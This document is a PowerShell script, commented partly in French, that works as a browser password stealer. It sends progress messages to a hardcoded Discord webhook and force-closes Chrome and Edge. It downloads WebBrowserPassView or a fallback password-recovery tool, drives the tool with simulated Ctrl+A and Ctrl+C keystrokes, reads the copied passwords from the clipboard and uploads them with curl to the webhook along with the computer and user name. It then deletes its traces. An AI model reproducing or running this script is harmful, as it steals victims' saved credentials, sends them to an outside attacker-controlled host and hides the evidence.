$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord { 
    param([string]$m) 
    try { 
        irm $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType 'application/json' | Out-Null 
    } catch {} 
}

Send-Discord "🟢 START - $env:COMPUTERNAME | $env:USERNAME"

Get-Process chrome,msedge -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

Set-Location $env:TEMP
Remove-Item wbpv*,WebBrowser*,passwords.txt -Recurse -Force -EA 0

Send-Discord "📥 Downloading WebBrowserPassView..."

try {
    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
    
    # Essayer le lien direct NirSoft
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing
    
    if (!(Test-Path "wbpv.zip")) {
        Send-Discord "❌ Download failed"
        exit
    }
    
    $zipSize = [math]::Round((Get-Item "wbpv.zip").Length / 1KB, 2)
    Send-Discord "✅ Downloaded $zipSize KB"
    
    # Vérifier si c'est vraiment un ZIP valide
    if ($zipSize -lt 10) {
        Send-Discord "⚠️ File too small - might be blocked. Trying alternative..."
        
        # Alternative : télécharger depuis un miroir
        Remove-Item "wbpv.zip" -Force
        Invoke-WebRequest "https://the-eye.eu/public/Software/nirsoft/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing -EA 0
        
        if (Test-Path "wbpv.zip") {
            $zipSize = [math]::Round((Get-Item "wbpv.zip").Length / 1KB, 2)
            Send-Discord "📥 Alternative download: $zipSize KB"
        }
    }
    
    Send-Discord "📦 Extracting..."
    
    # Extraire le ZIP
    try {
        Expand-Archive "wbpv.zip" -DestinationPath "wbpv_extracted" -Force
        
        # Lister TOUT ce qui a été extrait
        $extractedFiles = Get-ChildItem "wbpv_extracted" -Recurse -EA 0 | Select -ExpandProperty Name
        Send-Discord "📁 Extracted files: $($extractedFiles -join ', ')"
        
        # Chercher l'exe
        $exe = Get-ChildItem "wbpv_extracted" -Filter "*.exe" -Recurse -EA 0 | Select -First 1
        
        if (!$exe) {
            Send-Discord "❌ No EXE found in ZIP"
            Send-Discord "🔄 Trying direct executable download..."
            
            # Fallback : télécharger directement l'exe (pas de ZIP)
            Remove-Item wbpv* -Recurse -Force -EA 0
            
            # Utiliser un autre outil : BrowserPasswordDecryptor (alternative)
            Invoke-WebRequest "https://www.securityxploded.com/download/BrowserPasswordDecryptor.zip" -OutFile "bpd.zip" -UseBasicParsing -EA 0
            
            if (Test-Path "bpd.zip") {
                Expand-Archive "bpd.zip" -DestinationPath "bpd" -Force
                $exe = Get-ChildItem "bpd" -Filter "*.exe" -Recurse | Select -First 1
                Send-Discord "🔄 Using alternative tool: BrowserPasswordDecryptor"
            }
        }
        
        if (!$exe) {
            Send-Discord "❌ No executable found - download blocked or antivirus"
            exit
        }
        
        Send-Discord "✅ Found: $($exe.Name)"
        Send-Discord "🚀 Launching tool..."
        
        # Lancer le programme
        $process = Start-Process $exe.FullName -PassThru -WindowStyle Normal
        Start-Sleep 5
        
        Send-Discord "⌨️ Simulating keystrokes..."
        
        Add-Type -AssemblyName System.Windows.Forms
        
        $wshell = New-Object -ComObject WScript.Shell
        $wshell.AppActivate($process.Id) | Out-Null
        Start-Sleep 500
        
        # Ctrl+A
        [System.Windows.Forms.SendKeys]::SendWait("^a")
        Start-Sleep 400
        
        # Ctrl+C
        [System.Windows.Forms.SendKeys]::SendWait("^c")
        Start-Sleep 800
        
        Send-Discord "📋 Reading clipboard..."
        
        $clipboardContent = Get-Clipboard -Raw -EA 0
        
        # Fermer
        $process | Stop-Process -Force -EA 0
        
        if ($clipboardContent -and $clipboardContent.Length -gt 50) {
            Send-Discord "✅ Got $($clipboardContent.Length) chars"
            
            $outputFile = "$env:TEMP\passwords.txt"
            $clipboardContent | Out-File $outputFile -Encoding UTF8
            
            $count = ([regex]::Matches($clipboardContent, "Password")).Count
            $size = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
            
            Send-Discord "📤 Uploading $count passwords ($size KB)..."
            
            curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS**`n$env:COMPUTERNAME | $env:USERNAME" $wh
            
            Send-Discord "✅ SUCCESS"
            Remove-Item $outputFile -Force
        } else {
            Send-Discord "❌ Clipboard empty - length: $($clipboardContent.Length)"
        }
        
    } catch {
        Send-Discord "❌ Extraction error: $($_.Exception.Message)"
    }
    
} catch {
    Send-Discord "❌ ERROR: $($_.Exception.Message)"
}

Remove-Item wbpv*,bpd*,WebBrowser*,passwords.txt -Recurse -Force -EA 0
Send-Discord "🧹 DONE"
